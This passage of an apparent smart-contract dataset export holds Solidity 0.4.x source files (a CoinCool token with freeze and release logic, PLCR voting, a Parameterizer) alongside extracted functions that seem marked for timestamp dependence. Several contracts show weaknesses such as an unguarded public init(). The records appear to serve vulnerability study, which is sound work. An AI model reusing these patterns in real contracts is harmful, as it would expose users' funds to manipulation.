    "function SpaceWar() public {\nowner = msg.sender;\nspaceData[0] = SpaceData(500, 1, 5, 0, 999);\nspaceData[1] = SpaceData(50000, 10, 500, 0, 999);\nspaceData[2] = SpaceData(5000000, 100, 50000, 0, 999);\nspaceData[3] = SpaceData(80000000, 1000, 800000, 0, 999);\nspaceData[4] = SpaceData(500000000, 20000, 5000000, 0.01 ether, 999);\nspaceData[5] = SpaceData(10000000000, 100000, 100000000, 0, 999);\nspaceData[6] = SpaceData(100000000000, 1000000, 1000000000, 0, 999);\nspaceData[7] = SpaceData(1000000000000, 50000000, 10000000000, 0.1 ether, 999);\nspaceData[8] = SpaceData(10000000000000, 100000000,100000000000, 0, 999);\nboostData[0] = BoostData(30, 0.01 ether);\nboostData[1] = BoostData(50, 0.1 ether);\nboostData[2] = BoostData(100, 1 ether);\ntopindex = 0;\nhoneyPotAmount = 0;\ndevFund = 0;\njackPot = 0;\nnextPotDistributionTime = block.timestamp;\nhoneyPotSharePct = 90;\nboosterHolders[0] = owner;\nboosterHolders[1] = owner;\nboosterHolders[2] = owner;\nboosterHolders[3] = owner;\nboosterHolders[4] = owner;\nboosterIndex = 0;\nnextBoosterPrice = 0.1 ether;\ntroopData[0] = TroopData(10, 0, 100000, 0);\ntroopData[1] = TroopData(1000, 0, 80000000, 0);\ntroopData[2] = TroopData(100000, 0, 1000000000, 0.01 ether);\ntroopData[3] = TroopData(0, 15, 100000, 0);\ntroopData[4] = TroopData(0, 1500, 80000000, 0);\ntroopData[5] = TroopData(0, 150000, 1000000000, 0.01 ether);\nhoneyPotPerCycle.push(0);\nglobalICOPerCycle.push(1);\ncycleCount = 0;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1f9c"
  },
  "filename": "9843.sol",
  "content": "pragma solidity ^0.4.21;\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\nlibrary DateTime {\n struct MyDateTime {\n uint16 year;\n uint8 month;\n uint8 day;\n uint8 hour;\n uint8 minute;\n uint8 second;\n uint8 weekday;\n }\n uint constant DAY_IN_SECONDS = 86400;\n uint constant YEAR_IN_SECONDS = 31536000;\n uint constant LEAP_YEAR_IN_SECONDS = 31622400;\n uint constant HOUR_IN_SECONDS = 3600;\n uint constant MINUTE_IN_SECONDS = 60;\n uint16 constant ORIGIN_YEAR = 1970;\n function isLeapYear(uint16 year) internal pure returns (bool) {\n if (year % 4 != 0) {\n return false;\n }\n if (year % 100 != 0) {\n return true;\n }\n if (year % 400 != 0) {\n return false;\n }\n return true;\n }\n function leapYearsBefore(uint year) internal pure returns (uint) {\n year -= 1;\n return year / 4 - year / 100 + year / 400;\n }\n function getDaysInMonth(uint8 month, uint16 year) internal pure returns (uint8) {\n if (month == 1 || month == 3 || month == 5 || month == 7 || month == 8 || month == 10 || month == 12) {\n return 31;\n }\n else if (month == 4 || month == 6 || month == 9 || month == 11) {\n return 30;\n }\n else if (isLeapYear(year)) {\n return 29;\n }\n else {\n return 28;\n }\n }\n function parseTimestamp(uint timestamp) internal pure returns (MyDateTime dt) {\n uint secondsAccountedFor = 0;\n uint buf;\n uint8 i;\n dt.year = getYear(timestamp);\n buf = leapYearsBefore(dt.year) - leapYearsBefore(ORIGIN_YEAR);\n secondsAccountedFor += LEAP_YEAR_IN_SECONDS * buf;\n secondsAccountedFor += YEAR_IN_SECONDS * (dt.year - ORIGIN_YEAR - buf);\n uint secondsInMonth;\n for (i = 1; i <= 12; i++) {\n secondsInMonth = DAY_IN_SECONDS * getDaysInMonth(i, dt.year);\n if (secondsInMonth + secondsAccountedFor > timestamp) {\n dt.month = i;\n break;\n }\n secondsAccountedFor += secondsInMonth;\n }\n for (i = 1; i <= getDaysInMonth(dt.month, dt.year); i++) {\n if (DAY_IN_SECONDS + secondsAccountedFor > timestamp) {\n dt.day = i;\n break;\n }\n secondsAccountedFor += DAY_IN_SECONDS;\n }\n dt.hour = 0;\n dt.minute = 0;\n dt.second = 0;\n dt.weekday = 0;\n }\n function getYear(uint timestamp) internal pure returns (uint16) {\n uint secondsAccountedFor = 0;\n uint16 year;\n uint numLeapYears;\n year = uint16(ORIGIN_YEAR + timestamp / YEAR_IN_SECONDS);\n numLeapYears = leapYearsBefore(year) - leapYearsBefore(ORIGIN_YEAR);\n secondsAccountedFor += LEAP_YEAR_IN_SECONDS * numLeapYears;\n secondsAccountedFor += YEAR_IN_SECONDS * (year - ORIGIN_YEAR - numLeapYears);\n while (secondsAccountedFor > timestamp) {\n if (isLeapYear(uint16(year - 1))) {\n secondsAccountedFor -= LEAP_YEAR_IN_SECONDS;\n }\n else {\n secondsAccountedFor -= YEAR_IN_SECONDS;\n }\n year -= 1;\n }\n return year;\n }\n function getMonth(uint timestamp) internal pure returns (uint8) {\n return parseTimestamp(timestamp).month;\n }\n function getDay(uint timestamp) internal pure returns (uint8) {\n return parseTimestamp(timestamp).day;\n }\n function getHour(uint timestamp) internal pure returns (uint8) {\n return uint8((timestamp / 60 / 60) % 24);\n }\n function getMinute(uint timestamp) internal pure returns (uint8) {\n return uint8((timestamp / 60) % 60);\n }\n function getSecond(uint timestamp) internal pure returns (uint8) {\n return uint8(timestamp % 60);\n }\n function toTimestamp(uint16 year, uint8 month, uint8 day) internal pure returns (uint timestamp) {\n return toTimestamp(year, month, day, 0, 0, 0);\n }\n function toTimestamp(uint16 year, uint8 month, uint8 day, uint8 hour, uint8 minute, uint8 second) internal pure returns (uint timestamp) {\n uint16 i;\n for (i = ORIGIN_YEAR; i < year; i++) {\n if (isLeapYear(i)) {\n timestamp += LEAP_YEAR_IN_SECONDS;\n }\n else {\n timestamp += YEAR_IN_SECONDS;\n }\n }\n uint8[12] memory monthDayCounts;\n monthDayCounts[0] = 31;\n if (isLeapYear(year)) {\n monthDayCounts[1] = 29;\n }\n else {\n monthDayCounts[1] = 28;\n }\n monthDayCounts[2] = 31;\n monthDayCounts[3] = 30;\n monthDayCounts[4] = 31;\n monthDayCounts[5] = 30;\n monthDayCounts[6] = 31;\n monthDayCounts[7] = 31;\n monthDayCounts[8] = 30;\n monthDayCounts[9] = 31;\n monthDayCounts[10] = 30;\n monthDayCounts[11] = 31;\n for (i = 1; i < month; i++) {\n timestamp += DAY_IN_SECONDS * monthDayCounts[i - 1];\n }\n timestamp += DAY_IN_SECONDS * (day - 1);\n timestamp += HOUR_IN_SECONDS * (hour);\n timestamp += MINUTE_IN_SECONDS * (minute);\n timestamp += second;\n return timestamp;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Claimable is Ownable {\n address public pendingOwner;\n modifier onlyPendingOwner() {\n require(msg.sender == pendingOwner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n pendingOwner = newOwner;\n }\n function claimOwnership() onlyPendingOwner public {\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract ReentrancyGuard {\n bool private reentrancyLock = false;\n modifier nonReentrant() {\n require(!reentrancyLock);\n reentrancyLock = true;\n _;\n reentrancyLock = false;\n }\n}\ncontract StandardBurnableToken is StandardToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public returns (bool) {\n require(_value <= balances[msg.sender]);\n address burner = msg.sender;\n balances[burner] = balances[burner].sub(_value);\n totalSupply_ = totalSupply_.sub(_value);\n emit Burn(burner, _value);\n return true;\n }\n}\ncontract Operational is Claimable {\n address public operator;\n function Operational(address _operator) public {\n operator = _operator;\n }\n modifier onlyOperator() {\n require(msg.sender == operator);\n _;\n }\n function transferOperator(address newOperator) public onlyOwner {\n require(newOperator != address(0));\n operator = newOperator;\n }\n}\ncontract Frozenable is Operational, StandardBurnableToken, ReentrancyGuard {\n using DateTime for uint256;\n struct FrozenRecord {\n uint256 value;\n uint256 unfreezeIndex;\n }\n uint256 public frozenBalance;\n mapping (uint256 => FrozenRecord) public frozenRecords;\n uint256 mulDecimals = 100000000;\n event SystemFreeze(address indexed owner, uint256 value, uint256 unfreezeIndex);\n event Unfreeze(address indexed owner, uint256 value, uint256 unfreezeTime);\n function Frozenable(address _operator) Operational(_operator) public {}\n function systemFreeze(uint256 _value, uint256 _unfreezeTime) internal {\n uint256 unfreezeIndex = uint256(_unfreezeTime.parseTimestamp().year) * 10000 + uint256(_unfreezeTime.parseTimestamp().month) * 100 + uint256(_unfreezeTime.parseTimestamp().day);\n balances[owner] = balances[owner].sub(_value);\n frozenRecords[unfreezeIndex] = FrozenRecord({value: _value, unfreezeIndex: unfreezeIndex});\n frozenBalance = frozenBalance.add(_value);\n emit SystemFreeze(owner, _value, _unfreezeTime);\n }\n function unfreeze(uint256 timestamp) public returns (uint256 unfreezeAmount) {\n require(timestamp <= block.timestamp);\n uint256 unfreezeIndex = uint256(timestamp.parseTimestamp().year) * 10000 + uint256(timestamp.parseTimestamp().month) * 100 + uint256(timestamp.parseTimestamp().day);\n frozenBalance = frozenBalance.sub(frozenRecords[unfreezeIndex].value);\n balances[owner] = balances[owner].add(frozenRecords[unfreezeIndex].value);\n unfreezeAmount = frozenRecords[unfreezeIndex].value;\n emit Unfreeze(owner, unfreezeAmount, timestamp);\n frozenRecords[unfreezeIndex].value = 0;\n return unfreezeAmount;\n }\n}\ncontract Releaseable is Frozenable {\n using SafeMath for uint;\n uint256 public createTime;\n uint256 public standardReleaseAmount = mulDecimals.mul(512000);\n uint256 public releaseAmountPerDay = mulDecimals.mul(512000);\n uint256 public releasedSupply = 0;\n event Release(address indexed receiver, uint256 value, uint256 sysAmount, uint256 releaseTime);\n struct ReleaseRecord {\n uint256 amount;\n uint256 releaseIndex;\n }\n mapping (uint256 => ReleaseRecord) public releaseRecords;\n function Releaseable(\n address _operator, uint256 _initialSupply\n ) Frozenable(_operator) public {\n createTime = 1529078400;\n releasedSupply = _initialSupply;\n balances[owner] = _initialSupply;\n totalSupply_ = mulDecimals.mul(187140000);\n }\n function release(uint256 timestamp, uint256 sysAmount) public onlyOperator returns(uint256 _actualRelease) {\n require(timestamp >= createTime && timestamp <= block.timestamp);\n require(!checkIsReleaseRecordExist(timestamp));\n updateReleaseAmount(timestamp);\n require(sysAmount <= releaseAmountPerDay.mul(4).div(5));\n require(totalSupply_ >= releasedSupply.add(releaseAmountPerDay));\n balances[owner] = balances[owner].add(releaseAmountPerDay);\n releasedSupply = releasedSupply.add(releaseAmountPerDay);\n uint256 _releaseIndex = uint256(timestamp.parseTimestamp().year) * 10000 + uint256(timestamp.parseTimestamp().month) * 100 + uint256(timestamp.parseTimestamp().day);\n releaseRecords[_releaseIndex] = ReleaseRecord(releaseAmountPerDay, _releaseIndex);\n emit Release(owner, releaseAmountPerDay, sysAmount, timestamp);\n systemFreeze(sysAmount.div(5), timestamp.add(180 days));\n systemFreeze(sysAmount.mul(6).div(10), timestamp.add(200 years));\n return releaseAmountPerDay;\n }\n function checkIsReleaseRecordExist(uint256 timestamp) internal view returns(bool _exist) {\n bool exist = false;\n uint256 releaseIndex = uint256(timestamp.parseTimestamp().year) * 10000 + uint256(timestamp.parseTimestamp().month) * 100 + uint256(timestamp.parseTimestamp().day);\n if (releaseRecords[releaseIndex].releaseIndex == releaseIndex){\n exist = true;\n }\n return exist;\n }\n function updateReleaseAmount(uint256 timestamp) internal {\n uint256 timeElapse = timestamp.sub(createTime);\n uint256 cycles = timeElapse.div(180 days);\n if (cycles > 0) {\n if (cycles <= 10) {\n releaseAmountPerDay = standardReleaseAmount;\n for (uint index = 0; index < cycles; index++) {\n releaseAmountPerDay = releaseAmountPerDay.div(2);\n }\n } else {\n releaseAmountPerDay = 0;\n }\n }\n }\n}\ncontract CoinCool is Releaseable {\n string public standard = '2018061610';\n string public name = 'CoinCoolToken';\n string public symbol = 'CCT';\n uint8 public decimals = 8;\n function CoinCool() Releaseable(0xe8358AfA9Bc309c4A106dc41782340b91817BC64, mulDecimals.mul(3000000)) public {}\n}",
  "extract_feature": [
    "function unfreeze(uint256 timestamp) public returns (uint256 unfreezeAmount) {\nrequire(timestamp <= block.timestamp);\nuint256 unfreezeIndex = uint256(timestamp.parseTimestamp().year) * 10000 + uint256(timestamp.parseTimestamp().month) * 100 + uint256(timestamp.parseTimestamp().day);\nfrozenBalance = frozenBalance.sub(frozenRecords[unfreezeIndex].value);\nbalances[owner] = balances[owner].add(frozenRecords[unfreezeIndex].value);\nunfreezeAmount = frozenRecords[unfreezeIndex].value;\nemit Unfreeze(owner, unfreezeAmount, timestamp);\nfrozenRecords[unfreezeIndex].value = 0;\nreturn unfreezeAmount;\n}",
    "function release(uint256 timestamp, uint256 sysAmount) public onlyOperator returns(uint256 _actualRelease) {\nrequire(timestamp >= createTime && timestamp <= block.timestamp);\nrequire(!checkIsReleaseRecordExist(timestamp));\nupdateReleaseAmount(timestamp);\nrequire(sysAmount <= releaseAmountPerDay.mul(4).div(5));\nrequire(totalSupply_ >= releasedSupply.add(releaseAmountPerDay));\nbalances[owner] = balances[owner].add(releaseAmountPerDay);\nreleasedSupply = releasedSupply.add(releaseAmountPerDay);\nuint256 _releaseIndex = uint256(timestamp.parseTimestamp().year) * 10000 + uint256(timestamp.parseTimestamp().month) * 100 + uint256(timestamp.parseTimestamp().day);\nreleaseRecords[_releaseIndex] = ReleaseRecord(releaseAmountPerDay, _releaseIndex);\nemit Release(owner, releaseAmountPerDay, sysAmount, timestamp);\nsystemFreeze(sysAmount.div(5), timestamp.add(180 days));\nsystemFreeze(sysAmount.mul(6).div(10), timestamp.add(200 years));\nreturn releaseAmountPerDay;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1f9d"
  },
  "filename": "9850.sol",
  "content": "pragma solidity ^0.4.20;\npragma solidity^0.4.11;\nlibrary AttributeStore {\n struct Data {\n mapping(bytes32 => uint) store;\n }\n function getAttribute(Data storage self, bytes32 _UUID, string _attrName)\n public view returns (uint) {\n bytes32 key = keccak256(_UUID, _attrName);\n return self.store[key];\n }\n function setAttribute(Data storage self, bytes32 _UUID, string _attrName, uint _attrVal)\n public {\n bytes32 key = keccak256(_UUID, _attrName);\n self.store[key] = _attrVal;\n }\n}\npragma solidity^0.4.11;\nlibrary DLL {\n uint constant NULL_NODE_ID = 0;\n struct Node {\n uint next;\n uint prev;\n }\n struct Data {\n mapping(uint => Node) dll;\n }\n function isEmpty(Data storage self) public view returns (bool) {\n return getStart(self) == NULL_NODE_ID;\n }\n function contains(Data storage self, uint _curr) public view returns (bool) {\n if (isEmpty(self) || _curr == NULL_NODE_ID) {\n return false;\n }\n bool isSingleNode = (getStart(self) == _curr) && (getEnd(self) == _curr);\n bool isNullNode = (getNext(self, _curr) == NULL_NODE_ID) && (getPrev(self, _curr) == NULL_NODE_ID);\n return isSingleNode || !isNullNode;\n }\n function getNext(Data storage self, uint _curr) public view returns (uint) {\n return self.dll[_curr].next;\n }\n function getPrev(Data storage self, uint _curr) public view returns (uint) {\n return self.dll[_curr].prev;\n }\n function getStart(Data storage self) public view returns (uint) {\n return getNext(self, NULL_NODE_ID);\n }\n function getEnd(Data storage self) public view returns (uint) {\n return getPrev(self, NULL_NODE_ID);\n }\n function insert(Data storage self, uint _prev, uint _curr, uint _next) public {\n require(_curr != NULL_NODE_ID);\n remove(self, _curr);\n require(_prev == NULL_NODE_ID || contains(self, _prev));\n require(_next == NULL_NODE_ID || contains(self, _next));\n require(getNext(self, _prev) == _next);\n require(getPrev(self, _next) == _prev);\n self.dll[_curr].prev = _prev;\n self.dll[_curr].next = _next;\n self.dll[_prev].next = _curr;\n self.dll[_next].prev = _curr;\n }\n function remove(Data storage self, uint _curr) public {\n if (!contains(self, _curr)) {\n return;\n }\n uint next = getNext(self, _curr);\n uint prev = getPrev(self, _curr);\n self.dll[next].prev = prev;\n self.dll[prev].next = next;\n delete self.dll[_curr];\n }\n}\npragma solidity ^0.4.8;\ncontract EIP20Interface {\n uint256 public totalSupply;\n function balanceOf(address _owner) public view returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public view returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract PLCRVoting {\n event _VoteCommitted(uint indexed pollID, uint numTokens, address indexed voter);\n event _VoteRevealed(uint indexed pollID, uint numTokens, uint votesFor, uint votesAgainst, uint indexed choice, address indexed voter);\n event _PollCreated(uint voteQuorum, uint commitEndDate, uint revealEndDate, uint indexed pollID, address indexed creator);\n event _VotingRightsGranted(uint numTokens, address indexed voter);\n event _VotingRightsWithdrawn(uint numTokens, address indexed voter);\n event _TokensRescued(uint indexed pollID, address indexed voter);\n using AttributeStore for AttributeStore.Data;\n using DLL for DLL.Data;\n using SafeMath for uint;\n struct Poll {\n uint commitEndDate;\n uint revealEndDate;\n uint voteQuorum;\n uint votesFor;\n uint votesAgainst;\n mapping(address => bool) didCommit;\n mapping(address => bool) didReveal;\n }\n uint constant public INITIAL_POLL_NONCE = 0;\n uint public pollNonce;\n mapping(uint => Poll) public pollMap;\n mapping(address => uint) public voteTokenBalance;\n mapping(address => DLL.Data) dllMap;\n AttributeStore.Data store;\n EIP20Interface public token;\n function init(address _token) public {\n require(_token != 0 && address(token) == 0);\n token = EIP20Interface(_token);\n pollNonce = INITIAL_POLL_NONCE;\n }\n function requestVotingRights(uint _numTokens) public {\n require(token.balanceOf(msg.sender) >= _numTokens);\n voteTokenBalance[msg.sender] += _numTokens;\n require(token.transferFrom(msg.sender, this, _numTokens));\n emit _VotingRightsGranted(_numTokens, msg.sender);\n }\n function withdrawVotingRights(uint _numTokens) external {\n uint availableTokens = voteTokenBalance[msg.sender].sub(getLockedTokens(msg.sender));\n require(availableTokens >= _numTokens);\n voteTokenBalance[msg.sender] -= _numTokens;\n require(token.transfer(msg.sender, _numTokens));\n emit _VotingRightsWithdrawn(_numTokens, msg.sender);\n }\n function rescueTokens(uint _pollID) public {\n require(isExpired(pollMap[_pollID].revealEndDate));\n require(dllMap[msg.sender].contains(_pollID));\n dllMap[msg.sender].remove(_pollID);\n emit _TokensRescued(_pollID, msg.sender);\n }\n function rescueTokensInMultiplePolls(uint[] _pollIDs) public {\n for (uint i = 0; i < _pollIDs.length; i++) {\n rescueTokens(_pollIDs[i]);\n }\n }\n function commitVote(uint _pollID, bytes32 _secretHash, uint _numTokens, uint _prevPollID) public {\n require(commitPeriodActive(_pollID));\n if (voteTokenBalance[msg.sender] < _numTokens) {\n uint remainder = _numTokens.sub(voteTokenBalance[msg.sender]);\n requestVotingRights(remainder);\n }\n require(voteTokenBalance[msg.sender] >= _numTokens);\n require(_pollID != 0);\n require(_secretHash != 0);\n require(_prevPollID == 0 || dllMap[msg.sender].contains(_prevPollID));\n uint nextPollID = dllMap[msg.sender].getNext(_prevPollID);\n if (nextPollID == _pollID) {\n nextPollID = dllMap[msg.sender].getNext(_pollID);\n }\n require(validPosition(_prevPollID, nextPollID, msg.sender, _numTokens));\n dllMap[msg.sender].insert(_prevPollID, _pollID, nextPollID);\n bytes32 UUID = attrUUID(msg.sender, _pollID);\n store.setAttribute(UUID, \"numTokens\", _numTokens);\n store.setAttribute(UUID, \"commitHash\", uint(_secretHash));\n pollMap[_pollID].didCommit[msg.sender] = true;\n emit _VoteCommitted(_pollID, _numTokens, msg.sender);\n }\n function commitVotes(uint[] _pollIDs, bytes32[] _secretHashes, uint[] _numsTokens, uint[] _prevPollIDs) external {\n require(_pollIDs.length == _secretHashes.length);\n require(_pollIDs.length == _numsTokens.length);\n require(_pollIDs.length == _prevPollIDs.length);\n for (uint i = 0; i < _pollIDs.length; i++) {\n commitVote(_pollIDs[i], _secretHashes[i], _numsTokens[i], _prevPollIDs[i]);\n }\n }\n function validPosition(uint _prevID, uint _nextID, address _voter, uint _numTokens) public constant returns (bool valid) {\n bool prevValid = (_numTokens >= getNumTokens(_voter, _prevID));\n bool nextValid = (_numTokens <= getNumTokens(_voter, _nextID) || _nextID == 0);\n return prevValid && nextValid;\n }\n function revealVote(uint _pollID, uint _voteOption, uint _salt) public {\n require(revealPeriodActive(_pollID));\n require(pollMap[_pollID].didCommit[msg.sender]);\n require(!pollMap[_pollID].didReveal[msg.sender]);\n require(keccak256(_voteOption, _salt) == getCommitHash(msg.sender, _pollID));\n uint numTokens = getNumTokens(msg.sender, _pollID);\n if (_voteOption == 1) {\n pollMap[_pollID].votesFor += numTokens;\n } else {\n pollMap[_pollID].votesAgainst += numTokens;\n }\n dllMap[msg.sender].remove(_pollID);\n pollMap[_pollID].didReveal[msg.sender] = true;\n emit _VoteRevealed(_pollID, numTokens, pollMap[_pollID].votesFor, pollMap[_pollID].votesAgainst, _voteOption, msg.sender);\n }\n function revealVotes(uint[] _pollIDs, uint[] _voteOptions, uint[] _salts) external {\n require(_pollIDs.length == _voteOptions.length);\n require(_pollIDs.length == _salts.length);\n for (uint i = 0; i < _pollIDs.length; i++) {\n revealVote(_pollIDs[i], _voteOptions[i], _salts[i]);\n }\n }\n function getNumPassingTokens(address _voter, uint _pollID, uint _salt) public constant returns (uint correctVotes) {\n require(pollEnded(_pollID));\n require(pollMap[_pollID].didReveal[_voter]);\n uint winningChoice = isPassed(_pollID) ? 1 : 0;\n bytes32 winnerHash = keccak256(winningChoice, _salt);\n bytes32 commitHash = getCommitHash(_voter, _pollID);\n require(winnerHash == commitHash);\n return getNumTokens(_voter, _pollID);\n }\n function startPoll(uint _voteQuorum, uint _commitDuration, uint _revealDuration) public returns (uint pollID) {\n pollNonce = pollNonce + 1;\n uint commitEndDate = block.timestamp.add(_commitDuration);\n uint revealEndDate = commitEndDate.add(_revealDuration);\n pollMap[pollNonce] = Poll({\n voteQuorum: _voteQuorum,\n commitEndDate: commitEndDate,\n revealEndDate: revealEndDate,\n votesFor: 0,\n votesAgainst: 0\n });\n emit _PollCreated(_voteQuorum, commitEndDate, revealEndDate, pollNonce, msg.sender);\n return pollNonce;\n }\n function isPassed(uint _pollID) constant public returns (bool passed) {\n require(pollEnded(_pollID));\n Poll memory poll = pollMap[_pollID];\n return (100 * poll.votesFor) > (poll.voteQuorum * (poll.votesFor + poll.votesAgainst));\n }\n function getTotalNumberOfTokensForWinningOption(uint _pollID) constant public returns (uint numTokens) {\n require(pollEnded(_pollID));\n if (isPassed(_pollID))\n return pollMap[_pollID].votesFor;\n else\n return pollMap[_pollID].votesAgainst;\n }\n function pollEnded(uint _pollID) constant public returns (bool ended) {\n require(pollExists(_pollID));\n return isExpired(pollMap[_pollID].revealEndDate);\n }\n function commitPeriodActive(uint _pollID) constant public returns (bool active) {\n require(pollExists(_pollID));\n return !isExpired(pollMap[_pollID].commitEndDate);\n }\n function revealPeriodActive(uint _pollID) constant public returns (bool active) {\n require(pollExists(_pollID));\n return !isExpired(pollMap[_pollID].revealEndDate) && !commitPeriodActive(_pollID);\n }\n function didCommit(address _voter, uint _pollID) constant public returns (bool committed) {\n require(pollExists(_pollID));\n return pollMap[_pollID].didCommit[_voter];\n }\n function didReveal(address _voter, uint _pollID) constant public returns (bool revealed) {\n require(pollExists(_pollID));\n return pollMap[_pollID].didReveal[_voter];\n }\n function pollExists(uint _pollID) constant public returns (bool exists) {\n return (_pollID != 0 && _pollID <= pollNonce);\n }\n function getCommitHash(address _voter, uint _pollID) constant public returns (bytes32 commitHash) {\n return bytes32(store.getAttribute(attrUUID(_voter, _pollID), \"commitHash\"));\n }\n function getNumTokens(address _voter, uint _pollID) constant public returns (uint numTokens) {\n return store.getAttribute(attrUUID(_voter, _pollID), \"numTokens\");\n }\n function getLastNode(address _voter) constant public returns (uint pollID) {\n return dllMap[_voter].getPrev(0);\n }\n function getLockedTokens(address _voter) constant public returns (uint numTokens) {\n return getNumTokens(_voter, getLastNode(_voter));\n }\n function getInsertPointForNumTokens(address _voter, uint _numTokens, uint _pollID)\n constant public returns (uint prevNode) {\n uint nodeID = getLastNode(_voter);\n uint tokensInNode = getNumTokens(_voter, nodeID);\n while(nodeID != 0) {\n tokensInNode = getNumTokens(_voter, nodeID);\n if(tokensInNode <= _numTokens) {\n if(nodeID == _pollID) {\n nodeID = dllMap[_voter].getPrev(nodeID);\n }\n return nodeID;\n }\n nodeID = dllMap[_voter].getPrev(nodeID);\n }\n return nodeID;\n }\n function isExpired(uint _terminationDate) constant public returns (bool expired) {\n return (block.timestamp > _terminationDate);\n }\n function attrUUID(address _user, uint _pollID) public pure returns (bytes32 UUID) {\n return keccak256(_user, _pollID);\n }\n}\npragma solidity^0.4.11;\ncontract Parameterizer {\n event _ReparameterizationProposal(string name, uint value, bytes32 propID, uint deposit, uint appEndDate, address indexed proposer);\n event _NewChallenge(bytes32 indexed propID, uint challengeID, uint commitEndDate, uint revealEndDate, address indexed challenger);\n event _ProposalAccepted(bytes32 indexed propID, string name, uint value);\n event _ProposalExpired(bytes32 indexed propID);\n event _ChallengeSucceeded(bytes32 indexed propID, uint indexed challengeID, uint rewardPool, uint totalTokens);\n event _ChallengeFailed(bytes32 indexed propID, uint indexed challengeID, uint rewardPool, uint totalTokens);\n event _RewardClaimed(uint indexed challengeID, uint reward, address indexed voter);\n using SafeMath for uint;\n struct ParamProposal {\n uint appExpiry;\n uint challengeID;\n uint deposit;\n string name;\n address owner;\n uint processBy;\n uint value;\n }\n struct Challenge {\n uint rewardPool;\n address challenger;\n bool resolved;\n uint stake;\n uint winningTokens;\n mapping(address => bool) tokenClaims;\n }\n mapping(bytes32 => uint) public params;\n mapping(uint => Challenge) public challenges;\n mapping(bytes32 => ParamProposal) public proposals;\n EIP20Interface public token;\n PLCRVoting public voting;\n uint public PROCESSBY = 604800;\n function init(\n address _token,\n address _plcr,\n uint[] _parameters\n ) public {\n require(_token != 0 && address(token) == 0);\n require(_plcr != 0 && address(voting) == 0);\n token = EIP20Interface(_token);\n voting = PLCRVoting(_plcr);\n set(\"minDeposit\", _parameters[0]);\n set(\"pMinDeposit\", _parameters[1]);\n set(\"applyStageLen\", _parameters[2]);\n set(\"pApplyStageLen\", _parameters[3]);\n set(\"commitStageLen\", _parameters[4]);\n set(\"pCommitStageLen\", _parameters[5]);\n set(\"revealStageLen\", _parameters[6]);\n set(\"pRevealStageLen\", _parameters[7]);\n set(\"dispensationPct\", _parameters[8]);\n 